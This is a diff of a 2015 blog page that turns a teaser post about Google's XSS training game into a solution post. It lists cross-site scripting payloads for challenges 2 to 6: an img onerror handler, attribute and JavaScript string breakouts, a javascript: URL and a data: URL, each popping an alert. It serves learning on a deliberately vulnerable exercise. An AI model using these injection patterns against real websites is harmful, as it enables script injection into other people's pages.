@@ -17,9 +17,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="The official blog of I4INFO, Knowledge for the better future!">
 
-    <title>Xss is old but gold! - I4INFO</title>
+    <title>Xss challenge solution!! - I4INFO</title>
 
-    <link rel="canonical" href="http://i4info.in//2015/09/13/web-security/">
+    <link rel="canonical" href="http://i4info.in//2015/10/06/xss-solution/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -90,11 +90,11 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <div class="post-heading">
-                    <h1>Xss is old but gold!</h1>
+                    <h1>Xss challenge solution!!</h1>
                     
-                    <h2 class="subheading">Google xss challenge!</h2>
+                    <h2 class="subheading">Google xss challenge Solution!</h2>
                     
-                    <span class="meta">Posted by Heeraj on September 13, 2015</span>
+                    <span class="meta">Posted by Heeraj on October 6, 2015</span>
                 </div>
             </div>
         </div>
@@ -114,22 +114,29 @@
 <script>
 (adsbygoogle = window.adsbygoogle || []).push({});
 </script></p>
-<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> Want to be a member of our team, contact us! </p>
+<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>
 
-<p>Xss - cross site scripting, may be an old security bug but what it can do is even dangerous in todays senario.</p>
+<p>Google XSS challenge solution!</p>
 
-<p>Its intresting if someone is wants to learn xss. Its a good chance now the google is hosting xss challenge by them.
-One xss bug in google can give you $7500. </p>
+<p>Challenge 2</p>
 
-<blockquote>" I may be an alert() , when I will be a big bang! "</blockquote>
+<blockquote>"ptr=&#x3C;img src=&#x22;hrj&#x22; onerror=&#x22;alert(&#x22;xss&#x22;)&#x3E;"</blockquote>
 
-<p>The challenge is available in <a href="https://xss-game.appspot.com/level2">xss-game</a> hosted by google.<p>
+<p>Challenge 3</p>
 
-<p>It would be an intresting challenge to solve . I will come up will the solution in my next blog.<p>
+<blockquote>&#x27; onerror=&#x27;alert(&#x22;xss&#x22;)&#x27;&#x3E;</blockquote>
 
-<p>The solution for the first blog is quite simple</p>
+<p>Challenge 4</p>
 
-<blockquote>&#x3C;srcipt&#x3E;alert(1)&#x3C;/script&#x3E;</blockquote>
+<blockquote>');alert('xss</blockquote>
+
+<p>Challenge 5</p>
+
+<blockquote>javascript%3Aalert(%22xss%22)</blockquote>
+
+<p>Challenge 6</p>
+
+<blockquote>#data:text/plain,alert('xss')
 
 <p>Stay tuned!<br /> Untill we come with our another blog!</p>
 
@@ -137,7 +144,7 @@ One xss bug in google can give you $7500. </p>
 
 
 
-</p></p></p></p>
+</blockquote>
 
 
                 <hr>
@@ -145,12 +152,12 @@ One xss bug in google can give you $7500. </p>
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2015/09/13/test-post/" data-toggle="tooltip" data-placement="top" title="Must read blogs for web security researchers!">&larr; Previous Post</a>
+                        <a href="/2015/10/04/DCTF/" data-toggle="tooltip" data-placement="top" title="Dctf Ctf">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2015/10/04/DCTF/" data-toggle="tooltip" data-placement="top" title="Dctf Ctf">Next Post &rarr;</a>
+                        <a href="/2015/10/15/php/" data-toggle="tooltip" data-placement="top" title="Php comparison operator">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
